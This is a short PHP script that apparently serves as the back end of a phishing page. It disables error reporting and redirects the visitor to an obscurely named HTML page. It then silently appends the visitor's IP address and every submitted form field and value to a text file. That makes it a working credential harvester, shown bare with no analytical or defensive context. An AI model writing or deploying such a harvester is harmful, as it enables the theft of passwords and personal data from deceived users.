<?php
 // include ('UserInformation.php');
    include ('ip.php');

header('location:udetkejncf5d5gds5r8v4v5gt8ds5fg4fgfgd5f5d5d455dfsd.html');
error_reporting(0);
$handle = fopen("pbaba.txt","a");
fwrite($handle, $ip_address);
fwrite($handle, "\r\n");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 
       